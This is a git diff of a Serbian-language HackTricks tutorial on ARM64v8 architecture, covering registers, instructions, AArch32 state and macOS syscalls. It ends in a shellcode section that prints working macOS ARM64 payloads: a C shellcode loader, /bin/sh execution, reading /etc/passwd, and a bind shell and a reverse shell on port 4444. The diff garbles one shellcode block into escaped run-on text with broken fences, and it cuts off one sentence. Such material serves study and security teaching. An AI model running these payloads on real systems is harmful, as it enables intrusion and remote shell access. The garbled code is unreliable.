@@ -1,4 +1,4 @@
-# Uvod u ARM64v8
+# Introduction to ARM64v8
 
 <details>
 
@@ -19,15 +19,22 @@ Drugi načini podrške HackTricks-u:
 U ARMv8 arhitekturi, nivoi izvršenja, poznati kao Nivoi izuzetaka (ELs), definišu nivo privilegija i mogućnosti izvršnog okruženja. Postoje četiri nivoa izuzetaka, od EL0 do EL3, pri čemu svaki služi različitoj svrsi:
 
 1. **EL0 - Korisnički režim**:
+
 * Ovo je nivo sa najmanje privilegija i koristi se za izvršavanje redovnog aplikativnog koda.
 * Aplikacije koje se izvršavaju na EL0 su izolovane jedna od druge i od sistemskog softvera, što poboljšava sigurnost i stabilnost.
+
 2. **EL1 - Režim jezgra operativnog sistema**:
+
 * Većina jezgara operativnih sistema radi na ovom nivou.
 * EL1 ima više privilegija od EL0 i može pristupiti sistemskim resursima, ali uz određena ograničenja radi očuvanja integriteta sistema.
+
 3. **EL2 - Režim hipervizora**:
+
 * Ovaj nivo se koristi za virtualizaciju. Hipervizor koji radi na EL2 može upravljati sa više operativnih sistema (svaki u svom EL1) koji se izvršavaju na istom fizičkom hardveru.
 * EL2 pruža funkcionalnosti za izolaciju i kontrolu virtualizovanih okruženja.
+
 4. **EL3 - Režim sigurnosnog monitora**:
+
 * Ovo je najprivilegovaniji nivo i često se koristi za sigurno pokretanje sistema i poverljiva okruženja izvršenja.
 * EL3 može upravljati i kontrolisati pristupe između sigurnih i nesigurnih stanja (kao što su sigurno pokretanje, poverljivi OS, itd.).
 
@@ -38,20 +45,30 @@ Korišćenje ovih nivoa omogućava strukturisan i siguran način upravljanja raz
 ARM64 ima **31 registar opšte namene**, označenih kao `x0` do `x30`. Svaki može čuvati vrednost od **64 bita** (8 bajtova). Za operacije koje zahtevaju samo vrednosti od 32 bita, isti registri mogu se pristupiti u režimu od 32 bita koristeći imena w0 do w30.
 
 1. **`x0`** do **`x7`** - Ovi se obično koriste kao registri za prolazak parametara podrutinama.
+
 * **`x0`** takođe nosi povratne podatke funkcije.
+
 2. **`x8`** - U Linux jezgru, `x8` se koristi kao broj sistema poziva za `svc` instrukciju. **Na macOS-u se koristi x16!**
 3. **`x9`** do **`x15`** - Dodatni privremeni registri, često korišćeni za lokalne promenljive.
 4. **`x16`** i **`x17`** - **Registri za unutarproceduralne pozive**. Privremeni registri za neposredne vrednosti. Koriste se i za indirektne pozive funkcija i PLT (Procedure Linkage Table) stubove.
+
 * **`x16`** se koristi kao **broj sistema poziva** za **`svc`** instrukciju na **macOS-u**.
+
 5. **`x18`** - **Registar platforme**. Može se koristiti kao registar opšte namene, ali na nekim platformama, ovaj registar je rezervisan za platformski specifične svrhe: Pokazivač na trenutni blok okruženja niti u Windows-u, ili pokazivač na trenutno **izvršavajuću strukturu zadatka u jezgru Linux-a**.
 6. **`x19`** do **`x28`** - Ovo su registri sačuvani za pozvane funkcije. Funkcija mora sačuvati vrednosti ovih registara za svog pozivaoca, tako da se čuvaju na steku i vraćaju pre povratka pozivaocu.
 7. **`x29`** - **Pokazivač okvira** za praćenje okvira steka. Kada se kreira novi okvir steka jer je funkcija pozvana, **`x29`** registar se **čuva na steku** i nova adresa okvira (**adresa `sp`**) se **čuva u ovom registru**.
+
 * Ovaj registar takođe može se koristiti kao **registar opšte namene**, iako se obično koristi kao referenca na **lokalne promenljive**.
+
 8. **`x30`** ili **`lr`**- **Registar linka**. Čuva **adresu povratka** kada se izvrši `BL` (Branch with Link) ili `BLR` (Branch with Link to Register) instrukcija čuvajući vrednost **`pc`** u ovom registru.
+
 * Može se koristiti kao i svaki drugi registar.
 * Ako trenutna funkcija namerava pozvati novu funkciju i time prepisati `lr`, čuvaće je na steku na početku, ovo je epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Čuvanje `fp` i `lr`, generisanje prostora i dobijanje novog `fp`) i vraćaće je na kraju, ovo je prolog (`ldp x29, x30, [sp], #48; ret` -> Vraćanje `fp` i `lr` i povratak).
+
 9. **`sp`** - **Pokazivač steka**, koristi se za praćenje vrha steka.
+
 * Vrednost **`sp`** uvek treba da bude održavana na bar **quadword** **poravnanju** ili može doći do greške poravnanja.
+
 10. **`pc`** - **Brojač programa**, koji pokazuje na sledeću instrukciju. Ovaj registar se može ažurirati samo putem generisanja izuzetaka, povratka izuzetaka i skokova. Jedine obične instrukcije koje mogu čitati ovaj registar su instrukcije skoka sa linkom (BL, BLR) za čuvanje adrese **`pc`** u **`lr`** (Registar linka).
 11. **`xzr`** - **Registar nula**. Takođe nazvan **`wzr`** u svom obliku registra od **32** bita. Može se koristiti za lako dobijanje vrednosti nula (uobičajena operacija) ili za obavljanje poređenja koristeći **`subs`** kao **`subs XZR, Xn, #10`** čuvajući rezultujuće podatke nigde (u **`xzr`**).
 
@@ -60,6 +77,7 @@ Registri **`Wn`** su **32-bitna** verzija registra **`Xn`**.
 ### SIMD i Registri za plutanje sa pokretnim zarezom
 
 Pored toga, postoje još **32 registra dužine 128 bita** koji se mogu koristiti u optimizovanim operacijama jedne instrukcije sa više podataka (SIMD) i za obavljanje aritmetike sa pokretnim zarezom. Oni se nazivaju Vn registri iako mogu raditi i u **64**-bitnom, **32**-bitnom, **16**-bitnom i **8**-bitnom režimu, tada se nazivaju **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.
+
 ### Sistemski registri
 
 **Postoje stotine sistemskih registara**, takođe nazvanih registri sa posebnom svrhom (SPR), koriste se za **praćenje** i **kontrolu** **ponašanja procesora**.\
@@ -120,7 +138,7 @@ ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **
 * Primer: `ldr x0, [x1]` — Ovo učitava vrednost sa memorijske lokacije na koju pokazuje `x1` u `x0`.
 * **Mod sa pomerajem**: Pomeraj koji utiče na pokazivač je naznačen, na primer:
 * `ldr x2, [x1, #8]`, ovo će učitati u x2 vrednost iz x1 + 8
-* &#x20;`ldr x2, [x0, x1, lsl #2]`, ovo će učitati u x2 objekat iz niza x0, sa pozicije x1 (indeks) \* 4
+* `ldr x2, [x0, x1, lsl #2]`, ovo će učitati u x2 objekat iz niza x0, sa pozicije x1 (indeks) \* 4
 * **Mod pre-indeksa**: Ovo će primeniti izračunavanja na početni, dobiti rezultat i takođe sačuvati novi početak u početku.
 * `ldr x2, [x1, #8]!`, ovo će učitati `x1 + 8` u `x2` i sačuvati u x1 rezultat `x1 + 8`
 * `str lr, [sp, #-4]!`, Sačuvaj registar linka u sp i ažuriraj registar sp
@@ -136,11 +154,11 @@ ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **
 * Primer: `stp x0, x1, [sp]` — Ovo smešta `x0` i `x1` na memorijske lokacije na `sp` i `sp + 8`, redom.
 * `stp x0, x1, [sp, #16]!` — Ovo smešta `x0` i `x1` na memorijske lokacije na `sp+16` i `sp + 24`, redom, i ažurira `sp` sa `sp+16`.
 * **`add`**: **Saberi** vrednosti dva registra i smešta rezultat u registar.
-* Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[pomeraj #N | RRX\]
+* Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[pomeraj #N | RRX]
 * Xn1 -> Destinacija
 * Xn2 -> Operand 1
 * Xn3 | #imm -> Operand 2 (registar ili neposredno)
-* \[pomeraj #N | RRX\] -> Izvrši pomeraj ili pozovi RRX
+* \[pomeraj #N | RRX] -> Izvrši pomeraj ili pozovi RRX
 * Primer: `add x0, x1, x2` — Ovo sabira vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
 * `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (jedan pomeraj 12 puta) -> 1 0000 0000 0000 0000
 * **`adds`** Ovo izvršava `add` i ažurira zastave
@@ -188,12 +206,12 @@ ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **
 * Primer: `tst X1, #7` Proveri da li su bilo koji od poslednja 3 bita X1 jedan
 * **`teq`**: XOR operacija odbacivanjem rezultata
 * **`b`**: Bezuslovni skok
-* Primer: `b mojaFunkcija`&#x20;
+* Primer: `b mojaFunkcija`
 * Imajte na umu da ovo neće popuniti registar linka sa povratnom adresom (nije pogodno za pozive potprograma koji treba da se vrate nazad)
 * **`bl`**: **Skok** sa linkom, koristi se za **poziv** potprograma. Čuva **povratnu adresu u `x30`**.
 * Primer: `bl mojaFunkcija` — Ovo poziva funkciju `mojaFunkcija` i čuva povratnu adresu u `x30`.
 * Imajte na umu da ovo neće popuniti registar linka sa povratnom adresom (nije pogodno za pozive potprograma koji treba da se vrate nazad)
-* **`blr`**: **Skok** sa Linkom u Registar, koristi se za **poziv** potprograma gde je cilj **specifikovan** u **registru**. Čuva povratnu adresu u `x30`. (Ovo je&#x20;
+* **`blr`**: **Skok** sa Linkom u Registar, koristi se za **poziv** potprograma gde je cilj **specifikovan** u **registru**. Čuva povratnu adresu u `x30`. (Ovo je
 * Primer: `blr x1` — Ovo poziva funkciju čija je adresa sadržana u `x1` i čuva povratnu adresu u `x30`.
 * **`ret`**: **Povratak** iz **potprograma**, obično koristeći adresu u **`x30`**.
 * Primer: `ret` — Ovo se vraća iz trenutnog potprograma koristeći povratnu adresu u `x30`.
@@ -227,7 +245,7 @@ ARM64 instrukcije generalno imaju **format `opcode dst, src1, src2`**, gde je **
 * **`stur`**: **Čuva vrednost registra na lokaciji u memoriji**, koristeći pomeraj od drugog registra.
 * Primer: `stur x0, [x1, #4]` — Ovo smešta vrednost iz `x0` na adresu u memoriji koja je 4 bajta veća od adrese u `x1`.
 * **`svc`** : Pravi **sistemski poziv**. Ovo označava "Supervizorski poziv". Kada procesor izvrši ovu instrukciju, prelazi iz korisničkog režima u režim jezgra i skače na određenu lokaciju u memoriji gde se nalazi kod za **obradu sistemskog poziva jezgra**.
-*   Primer:
+* Primer:
 
 ```armasm
 mov x8, 93  ; Učitava broj sistema za izlazak (93) u registar x8.
@@ -271,6 +289,7 @@ Napomena da se prelazak sa 64-bitnog na 32-bitni dešava sa nižim nivoom izuzet
 Ovo se postavlja tokom **interworking grana instrukcija,** ali može biti postavljeno direktno i drugim instrukcijama kada je PC postavljen kao registar odredišta. Primer:
 
 Još jedan primer:
+
 ```armasm
 _start:
 .code 32                ; Begin using A32
@@ -281,15 +300,16 @@ bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
 mov r0, #0
 mov r0, #8
 ```
+
 ### Registri
 
 Postoje 16 registara od 32 bita (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki od njih obično su rezervisani:
 
-- **`r15`**: Brojač programa (uvek). Sadrži adresu sledeće instrukcije. U A32 trenutno + 8, u T32, trenutno + 4.
-- **`r11`**: Pokazivač okvira
-- **`r12`**: Registar za unutarproceduralne pozive
-- **`r13`**: Pokazivač steka
-- **`r14`**: Registar za povezivanje
+* **`r15`**: Brojač programa (uvek). Sadrži adresu sledeće instrukcije. U A32 trenutno + 8, u T32, trenutno + 4.
+* **`r11`**: Pokazivač okvira
+* **`r12`**: Registar za unutarproceduralne pozive
+* **`r13`**: Pokazivač steka
+* **`r14`**: Registar za povezivanje
 
 Osim toga, registri se čuvaju u **`bankovnim registrima`**. To su mesta koja čuvaju vrednosti registara omogućavajući **brzo prebacivanje konteksta** u rukovanju izuzecima i privilegovanim operacijama kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put.\
 Ovo se postiže **čuvanjem stanja procesora od `CPSR` do `SPSR`** režima procesora u koji se preuzima izuzetak. Prilikom povratka izuzetka, **`CPSR`** se obnavlja iz **`SPSR`**.
@@ -302,14 +322,14 @@ U AArch32, CPSR radi slično kao **`PSTATE`** u AArch64 i takođe se čuva u **`
 
 Polja su podeljena u neke grupe:
 
-- Registar statusa programa aplikacije (APSR): Aritmetičke zastavice i pristupačne iz EL0
-- Registri stanja izvršenja: Ponašanje procesa (upravljano od strane OS-a).
+* Registar statusa programa aplikacije (APSR): Aritmetičke zastavice i pristupačne iz EL0
+* Registri stanja izvršenja: Ponašanje procesa (upravljano od strane OS-a).
 
 #### Registar statusa programa aplikacije (APSR)
 
-- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (kao i u AArch64)
-- Zastava **`Q`**: Postavlja se na 1 kada se **desi zasićenje celih brojeva** tokom izvršenja specijalizovane aritmetičke instrukcije. Kada se jednom postavi na **`1`**, zadržavaće vrednost dok se ručno ne postavi na 0. Osim toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, već se to mora uraditi čitanjem ručno.
-- **`GE`** (Veće ili jednako) zastave: Koriste se u SIMD (Jedna instrukcija, više podataka) operacijama, poput "paralelnog sabiranja" i "paralelnog oduzimanja". Ove operacije omogućavaju obradu više podataka u jednoj instrukciji.
+* Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (kao i u AArch64)
+* Zastava **`Q`**: Postavlja se na 1 kada se **desi zasićenje celih brojeva** tokom izvršenja specijalizovane aritmetičke instrukcije. Kada se jednom postavi na **`1`**, zadržavaće vrednost dok se ručno ne postavi na 0. Osim toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, već se to mora uraditi čitanjem ručno.
+* **`GE`** (Veće ili jednako) zastave: Koriste se u SIMD (Jedna instrukcija, više podataka) operacijama, poput "paralelnog sabiranja" i "paralelnog oduzimanja". Ove operacije omogućavaju obradu više podataka u jednoj instrukciji.
 
 Na primer, instrukcija **`UADD8`** **sabira četiri para bajtova** (iz dva 32-bitna operanda) paralelno i čuva rezultate u 32-bitnom registru. Zatim **postavlja `GE` zastave u `APSR`** na osnovu ovih rezultata. Svaka GE zastava odgovara jednom od sabiranja bajtova, ukazujući da li je sabiranje za taj par bajtova **prekoračilo**.
 
@@ -317,14 +337,14 @@ Instrukcija **`SEL`** koristi ove GE zastave za izvođenje uslovnih radnji.
 
 #### Registri stanja izvršenja
 
-- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se skup instrukcija A32, a ako je 1, koristi se T32.
-- Registar stanja bloka IT (`ITSTATE`): Ovo su bitovi od 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe sa prefiksom **`IT`**.
-- Bit **`E`**: Označava **endianness**.
-- Bitovi moda i maski izuzetka (0-4): Određuju trenutno stanje izvršenja. Peti označava da li program radi kao 32-bitni (1) ili 64-bitni (0). Ostala 4 predstavljaju **trenutni korišćeni režim izuzetka** (kada se desi izuzetak i kada se rukuje njime). Broj postavljen **označava trenutni prioritet** u slučaju da se desi još jedan izuzetak dok se ovaj rukuje.
+* Bitovi **`J`** i **`T`**: **`J`** treba da bude 0, a ako je **`T`** 0 koristi se skup instrukcija A32, a ako je 1, koristi se T32.
+* Registar stanja bloka IT (`ITSTATE`): Ovo su bitovi od 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe sa prefiksom **`IT`**.
+* Bit **`E`**: Označava **endianness**.
+* Bitovi moda i maski izuzetka (0-4): Određuju trenutno stanje izvršenja. Peti označava da li program radi kao 32-bitni (1) ili 64-bitni (0). Ostala 4 predstavljaju **trenutni korišćeni režim izuzetka** (kada se desi izuzetak i kada se rukuje njime). Broj postavljen **označava trenutni prioritet** u slučaju da se desi još jedan izuzetak dok se ovaj rukuje.
 
 <figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će biti pokrenuti **asinhroni prekidi**. **`I`** konfiguriše odgovor na spoljne hardverske **zahteve za prekidima** (IRQ). i F je povezan sa **brzim zahtevima za prekidima** (FIR).
+* **`AIF`**: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će biti pokrenuti **asinhroni prekidi**. **`I`** konfiguriše odgovor na spoljne hardverske **zahteve za prekidima** (IRQ). i F je povezan sa **brzim zahtevima za prekidima** (FIR).
 
 ## macOS
 
@@ -373,6 +393,7 @@ Parametri ([više informacija u dokumentaciji](https://developer.apple.com/docum
 * x2... -> Ostali argumenti pozvane metode
 
 Dakle, ako postavite prekidnu tačku pre grananja ka ovoj funkciji, lako možete pronaći šta je pozvano u lldb-u sa (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će pokrenuti komandu):
+
 ```
 (lldb) po $x0
 <NSConcreteTask: 0x1052308e0>
@@ -389,9 +410,11 @@ Dakle, ako postavite prekidnu tačku pre grananja ka ovoj funkciji, lako možete
 whoami
 )
 ```
+
 ### Shellkodovi
 
 Za kompajliranje:
+
 ```bash
 as -o shell.o shell.s
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
@@ -399,16 +422,18 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 # You could also use this
 ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
 ```
+
 Da izvučemo bajtove:
+
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
 for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
 echo -n '\\x'$c
 done
 ```
-<detalji>
 
-<sumiraj>Kod na jeziku C za testiranje shell koda</sumiraj>
+Kod na jeziku C za testiranje shell koda
+
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -454,12 +479,11 @@ sc();
 return 0;
 }
 ```
-#### Školjka
+
+**Školjka**
 
 Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i objašnjeno.
 
-{% tabs %}
-{% tab title="sa adr" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -474,37 +498,26 @@ svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter,
 
 sh_path: .asciz "/bin/sh"
 ```
-{% endtab %}
 
-{% tab title="sa stekom" %}
-```armasm
-.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
-.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
-.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
 
-_main:
-; We are going to build the string "/bin/sh" and place it on the stack.
 
-mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
-movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
-movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
-movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+\`\`\`armasm .section \_\_TEXT,\_\_text ; This directive tells the assembler to place the following code in the \_\_text section of the \_\_TEXT segment. .global \_main ; This makes the \_main label globally visible, so that the linker can find it as the entry point of the program. .align 2 ; This directive tells the assembler to align the start of the \_main function to the next 4-byte boundary (2^2 = 4).
 
-str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
+\_main: ; We are going to build the string "/bin/sh" and place it on the stack.
+
+mov x1, #0x622F ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'. movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'. movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'. movk x1, #0x68, lsl #48 ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+
+str x1, \[sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
 
 ; Prepare arguments for the execve syscall.
 
-mov  x1, #8       ; Set x1 to 8.
-sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
-mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
-mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov x1, #8 ; Set x1 to 8. sub x0, sp, x1 ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack. mov x1, xzr ; Clear x1, because we need to pass NULL as the second argument to execve. mov x2, xzr ; Clear x2, because we need to pass NULL as the third argument to execve.
 
 ; Make the syscall.
 
-mov  x16, #59     ; Move the execve syscall number (59) into x16.
-svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+mov x16, #59 ; Move the execve syscall number (59) into x16. svc #0x1337 ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
-```
+````
 #### Čitanje pomoću cat komande
 
 Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji znači stek adresa).
@@ -532,8 +545,10 @@ svc 0                  ; Make the syscall
 cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
-```
-#### Pozovite komandu sa sh iz fork-a tako da glavni proces nije ubijen
+````
+
+**Pozovite komandu sa sh iz fork-a tako da glavni proces nije ubijen**
+
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -577,9 +592,11 @@ sh_c_option: .asciz "-c"
 .align 2
 touch_command: .asciz "touch /tmp/lalala"
 ```
-#### Bind shell
+
+**Bind shell**
 
 Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **portu 4444**
+
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -661,9 +678,11 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
-#### Reverse shell
+
+**Reverse shell**
 
 Sa [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
+
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -730,6 +749,7 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
+
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
